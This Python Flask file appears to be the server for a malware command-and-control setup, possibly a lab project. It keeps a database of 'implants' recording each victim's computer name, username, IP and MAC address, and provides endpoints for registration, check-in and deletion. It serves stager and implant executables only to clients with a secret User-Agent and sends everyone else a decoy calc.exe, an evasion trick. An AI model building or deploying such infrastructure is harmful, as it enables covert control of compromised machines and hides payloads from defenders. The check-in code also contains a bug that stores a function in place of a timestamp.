from flask import Flask, request, Response, jsonify, send_file, send_from_directory, safe_join, abort
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from dataclasses import dataclass
import json
import os
import pathlib

app = Flask(__name__, static_url_path='')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
db = SQLAlchemy(app)

app.config['EXECUTABLES'] = 'static/resources/exe/'

@dataclass
class Client(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(80), unique=True, nullable=False)
    date_created = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return '<Task %r>' % self.id

@dataclass
class Implant(db.Model):
    id: int
    guid: str
    computerName: str
    username: str
    ip: str
    mac: str
    lastSeen: datetime
    dateCreated: datetime

    id = db.Column(db.Integer, primary_key=True)
    guid = db.Column(db.String(80), unique=True)
    computerName = db.Column(db.String(80))
    username = db.Column(db.String(80))
    ip = db.Column(db.String(80), unique=True)
    mac = db.Column(db.String(80), unique=True)
    lastSeen = db.Column(db.DateTime, default=datetime.utcnow)
    dateCreated = db.Column(db.DateTime, default=datetime.utcnow)

    def __init__(self, guid, computerName, username, ip, mac):
        self.guid = guid
        self.computerName = computerName
        self.username = username
        self.ip = ip
        self.mac = mac

    def __repr__(self):
        return '<Implant %r>' % self.id

@dataclass
class Job(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    job = db.Column(db.String(80), nullable=False)
    job_init_time = db.Column(db.DateTime, nullable=False)
    job_status = db.Column(db.String(80), nullable=False)
    job_response = db.Column(db.String(80), nullable=False)

    def __repr__(self):
        return '<Task %r>' % self.id

@app.route('/')
def index():
    if(request.headers.get('User-Agent') == 'ch0nky'):
        return jsonify(Implant.query.all())
    else:
        return Response(status=404, mimetype='application/json')

@app.route('/stager.exe')
def stager():
    uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
    print(os.path.abspath(uploads))
    if(request.headers.get('User-Agent') == 'ch0nky'):
        try:
            return send_from_directory(os.path.abspath(uploads), "stager.exe")
        except FileNotFoundError:
            abort(404)
    else:
        try:
            return send_from_directory(os.path.abspath(uploads), "calc.exe")
        except FileNotFoundError:
            abort(404)

@app.route('/implant.exe')
def implant():
    uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
    print(os.path.abspath(uploads))
    if(request.headers.get('User-Agent') == 'ch0nky'):
        try:
            return send_from_directory(os.path.abspath(uploads), "implant.exe")
        except FileNotFoundError:
            abort(404)
    else:
        try:
            return send_from_directory(os.path.abspath(uploads), "calc.exe")
        except FileNotFoundError:
            abort(404)

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json(force=True)
    new_instance = Implant(data['guid'], data['computerName'], data['username'], data['ip'], data['mac'])

    try:
        db.session.add(new_instance)
        db.session.commit()
        data = Implant.query.all()
        for implant in data:
            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
        return Response(status=201, mimetype='application/json')
    except:
        return Response(status=500, mimetype='application/json')

@app.route('/checkin/<int:id>', methods=['POST'])
def checkin(id):
    implant_to_update = Implant.query.get_or_404(id)
    data = request.get_json(force=True)
    implant_to_update.computerName = data['computerName']
    implant_to_update.lastSeen = datetime.utcnow
    try:
        db.session.commit()
        implants = Implant.query.all()
        for implant in implants:
            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
        return Response(status=200, mimetype='application/json')
    except:
        return Response(status=500, mimetype='application/json')

@app.route('/delete/<int:id>')
def delete(id):
    implant_to_delete = Implant.query.get_or_404(id)

    try:
        db.session.delete(implant_to_delete)
        db.session.commit()
        implants = Implant.query.all()
        for implant in implants:
            print(implant.id, implant.guid, implant.computerName, implant.ip, implant.mac, implant.dateCreated, implant.lastSeen)
        return Response(status=200, mimetype='application/json')
    except:
        return Response(status=500, mimetype='application/json')

if __name__ == "__main__":
    app.run(host="localhost", port=8050, debug=True)